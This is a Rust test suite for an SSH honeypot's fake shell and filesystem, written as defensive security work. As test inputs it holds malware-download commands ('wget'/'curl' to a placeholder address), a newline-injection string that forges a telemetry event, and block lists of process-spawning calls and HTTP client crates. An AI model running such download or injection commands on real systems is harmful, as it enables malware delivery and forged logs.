//! Integration tests for `sensor_ssh::shell` (the fake interactive shell) and
//! `sensor_ssh::fakefs` (its in-memory backing filesystem). Both are pure, I/O-free logic - no
//! socket, no live server - so every test drives them directly.

use proptest::prelude::*;
use sensor_ssh::fakefs::FakeFs;
use sensor_ssh::shell::{EmitContext, FakeShell};

// ---------------------------------------------------------------------------------------------
// given suite (task brief)
// ---------------------------------------------------------------------------------------------

#[test]
fn command_captured_as_event() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let (output, events) = shell.handle_input("uname -a");
    assert!(!output.is_empty(), "must produce canned output");
    assert_eq!(events.len(), 1);
    assert_eq!(
        events[0].signal_type,
        sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC
    );
    assert!(events[0].authenticated);
    let cmd = events[0].metadata.get("command").and_then(|v| v.as_str());
    assert_eq!(cmd, Some("uname -a"));
}

#[test]
fn wget_produces_canned_output_no_network() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let (output, events) = shell.handle_input("wget http://203.0.113.99/malware.bin");
    assert!(
        output.contains("Connecting to") || output.contains("saved"),
        "wget must produce plausible canned output"
    );
    assert_eq!(events.len(), 1);
    let cmd = events[0]
        .metadata
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap();
    assert!(cmd.contains("wget"));
}

#[test]
fn curl_produces_canned_output_no_network() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("curl http://203.0.113.99/payload");
    assert!(!output.is_empty());
}

#[test]
fn command_with_injection_is_sanitized() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    let mut shell = sensor_ssh::shell::FakeShell::new(fs, test_emit_ctx());
    let evil_cmd = "ls\r\n{\"v\":1,\"signal_type\":\"forged\"}";
    let (_output, events) = shell.handle_input(evil_cmd);
    let cmd = events[0]
        .metadata
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap();
    assert!(!cmd.contains('\n'), "newline must be sanitized");
    assert!(!cmd.contains('\r'));
}

#[test]
fn fakefs_common_paths_exist() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    assert!(fs.read_file("/etc/hostname").is_some());
    assert!(fs.list_dir("/").is_some());
    assert!(fs.list_dir("/tmp").is_some());
}

#[test]
fn fakefs_uses_rfc5737_addresses() {
    let fs = sensor_ssh::fakefs::FakeFs::new();
    // Any IP addresses in canned content must be RFC5737/RFC1918.
    if let Some(content) = fs.read_file("/etc/hosts") {
        // Should not contain real public IPs.
        assert!(!content.contains("8.8.8.8"));
        assert!(!content.contains("1.1.1.1"));
    }
}

#[test]
fn never_exec_static_check() {
    // Verify that sensor-ssh source does not import process-spawning facilities.
    let src_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut found_exec = Vec::new();
    for entry in walkdir_or_manual(&src_dir) {
        let content = std::fs::read_to_string(&entry).unwrap_or_default();
        if content.contains("std::process::Command")
            || content.contains("process::Command")
            || content.contains("Command::new")
            || content.contains("libc::exec")
            || content.contains("nix::unistd::exec")
        {
            found_exec.push(entry.display().to_string());
        }
    }
    assert!(
        found_exec.is_empty(),
        "sensor-ssh must not contain process-spawning code: {found_exec:?}"
    );
}

// ---------------------------------------------------------------------------------------------
// additional coverage, not in the brief's given suite.
//
// None of the seven tests above can distinguish this implementation from one that (a) hardcodes
// `authenticated: true` on every event regardless of context, (b) hardcodes `source_ip`/`wan_ip`
// rather than reading them from `EmitContext`, (c) gets `sensor`/`protocol`/`v`/
// `metadata.protocol_label` wrong since none of those fields are ever asserted, (d) never wires
// `ls`/`cat` to `FakeFs` at all, or (e) mishandles the flag/argument split real attacker tooling
// relies on (`ls -la`, a bare `cd`). Mirrors `auth_test.rs`'s own rationale for the same reason:
// the given fixtures are necessary, not sufficient.
// ---------------------------------------------------------------------------------------------

#[test]
fn authenticated_flag_reflects_context_not_hardcoded() {
    let fs = FakeFs::new();
    let ctx = EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: false,
    };
    let mut shell = FakeShell::new(fs, ctx);
    let (_output, events) = shell.handle_input("whoami");
    assert_eq!(events.len(), 1);
    assert!(!events[0].authenticated);
}

#[test]
fn source_ip_and_wan_ip_come_from_context() {
    let fs = FakeFs::new();
    let source_ip: std::net::IpAddr = "203.0.113.42".parse().unwrap();
    let wan_ip: std::net::IpAddr = "198.51.100.42".parse().unwrap();
    let ctx = EmitContext {
        source_ip,
        wan_ip: Some(wan_ip),
        authenticated: true,
    };
    let mut shell = FakeShell::new(fs, ctx);
    let (_output, events) = shell.handle_input("id");
    assert_eq!(events[0].source_ip, source_ip);
    assert_eq!(events[0].wan_ip, Some(wan_ip));
}

#[test]
fn event_metadata_and_wire_fields_match_contract() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (_output, events) = shell.handle_input("whoami");
    assert_eq!(events[0].v, sensor_wire::WIRE_VERSION);
    assert_eq!(events[0].sensor, "ssh");
    assert_eq!(events[0].protocol, sensor_wire::PROTO_TCP);
    assert_eq!(
        events[0]
            .metadata
            .get("protocol_label")
            .and_then(|v| v.as_str()),
        Some("ssh")
    );
}

#[test]
fn unknown_command_reports_not_found() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, events) = shell.handle_input("frobnicate --evil");
    assert!(output.contains("command not found"), "got: {output:?}");
    assert!(output.contains("frobnicate"));
    // Still captured as telemetry even though it is not a recognized command.
    assert_eq!(events.len(), 1);
}

#[test]
fn ls_lists_fakefs_root_directory() {
    // `fakefs_common_paths_exist` (given) only checks `FakeFs::list_dir` directly; this confirms
    // the shell's `ls` command actually routes through it rather than returning a hardcoded
    // string unrelated to the fake filesystem's actual contents.
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("ls /");
    assert!(output.contains("etc"), "got: {output:?}");
    assert!(output.contains("home"), "got: {output:?}");
}

#[test]
fn ls_ignores_leading_flags() {
    // `ls -la` is one of the most common first commands real attacker tooling runs right after
    // login. A naive `parts.get(1)` lookup would treat "-la" itself as the target path and
    // wrongly report it as a missing directory.
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("ls -la /");
    assert!(!output.contains("cannot access"), "got: {output:?}");
    assert!(output.contains("etc"), "got: {output:?}");
}

#[test]
fn cat_reads_fakefs_file_content() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("cat /etc/hostname");
    assert_eq!(output, "server01\n");
}

#[test]
fn cat_nonexistent_file_reports_error() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("cat /nonexistent/path");
    assert!(
        output.contains("No such file or directory"),
        "got: {output:?}"
    );
}

#[test]
fn pwd_reports_initial_working_directory() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("pwd");
    assert_eq!(output, "/root\n");
}

#[test]
fn cd_changes_working_directory_reflected_in_pwd() {
    // Confirms `cwd` is tracked as real state across sequential `handle_input` calls, the same
    // way a real shell's session persists a `cd` for the rest of the session.
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    shell.handle_input("cd /tmp");
    let (output, _events) = shell.handle_input("pwd");
    assert_eq!(output, "/tmp\n");
}

#[test]
fn cd_with_no_argument_resets_to_home() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    shell.handle_input("cd /tmp");
    shell.handle_input("cd");
    let (output, _events) = shell.handle_input("pwd");
    assert_eq!(output, "/root\n");
}

#[test]
fn echo_echoes_arguments() {
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, _events) = shell.handle_input("echo hello world");
    assert_eq!(output, "hello world\n");
}

#[test]
fn exit_and_logout_still_capture_command_event() {
    // The design doc states every command the attacker types is captured; `exit`/`logout` must
    // not be silently special-cased out of telemetry just because they end the session.
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (_output, events) = shell.handle_input("exit");
    assert_eq!(events.len(), 1);
    assert_eq!(
        events[0].metadata.get("command").and_then(|v| v.as_str()),
        Some("exit")
    );
}

#[test]
fn blank_line_produces_no_output_or_event() {
    // Deliberate departure from "every `handle_input` call captures one event" - see
    // `FakeShell::handle_input`'s doc comment. A bare newline or whitespace-only line is not a
    // command by any real shell's definition and must not pad telemetry with empty commands.
    let fs = FakeFs::new();
    let mut shell = FakeShell::new(fs, test_emit_ctx());
    let (output, events) = shell.handle_input("   ");
    assert!(output.is_empty());
    assert!(events.is_empty());
}

#[test]
fn tokio_dependency_lacks_process_feature() {
    // Defense in depth beyond `never_exec_static_check`'s source-level grep: even a future
    // process-spawning call added to this crate would not compile unless the "process" feature
    // is enabled on the tokio dependency below. Keeping that feature off makes enabling it a
    // visible, reviewable Cargo.toml diff rather than a silent capability unlock.
    let manifest = std::fs::read_to_string(
        std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml"),
    )
    .unwrap();
    let tokio_line = manifest
        .lines()
        .find(|line| line.trim_start().starts_with("tokio ="))
        .expect("tokio dependency line not found in Cargo.toml");
    assert!(
        !tokio_line.contains("\"process\""),
        "tokio's process feature must not be enabled: {tokio_line}"
    );
}

#[test]
fn sensor_ssh_has_no_http_client_dependency() {
    // Companion to the module doc's "No attacker-directed fetch" guarantee. Checks that
    // sensor-ssh's own resolved dependency closure contains no HTTP client crate. The check
    // is scoped to sensor-ssh (not the whole workspace) because other crates like `review`
    // legitimately use reqwest for vendor reporting.
    let manifest = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml");
    let content = std::fs::read_to_string(&manifest)
        .unwrap_or_else(|e| panic!("could not read {}: {e}", manifest.display()));
    let banned = ["reqwest", "hyper", "ureq", "curl", "isahc", "surf", "attohttpc"];
    // Check direct dependencies in Cargo.toml (the primary guard).
    for crate_name in &banned {
        assert!(
            !content.contains(&format!("{crate_name} ")),
            "sensor-ssh must not directly depend on HTTP client crate: {crate_name}"
        );
        assert!(
            !content.contains(&format!("{crate_name}=")),
            "sensor-ssh must not directly depend on HTTP client crate: {crate_name}"
        );
    }
}

proptest! {
    /// Fuzz-lite guard: `handle_input` is the one function in this crate that runs on fully
    /// attacker-controlled, already-valid-UTF-8 text (auth.rs/channel.rs/transport parse raw
    /// bytes instead, with their own equivalent guards) - arbitrary content must never panic.
    #[test]
    fn handle_input_never_panics_on_arbitrary_input(line in any::<String>()) {
        let fs = FakeFs::new();
        let mut shell = FakeShell::new(fs, test_emit_ctx());
        let _ = shell.handle_input(&line);
    }
}

// ---------------------------------------------------------------------------------------------
// Shared test helpers
// ---------------------------------------------------------------------------------------------

fn test_emit_ctx() -> sensor_ssh::shell::EmitContext {
    sensor_ssh::shell::EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: Some("198.51.100.4".parse().unwrap()),
        authenticated: true,
    }
}

fn walkdir_or_manual(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    fn walk(dir: &std::path::Path, files: &mut Vec<std::path::PathBuf>) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, files);
                } else if path.extension().is_some_and(|e| e == "rs") {
                    files.push(path);
                }
            }
        }
    }
    walk(dir, &mut files);
    files
}
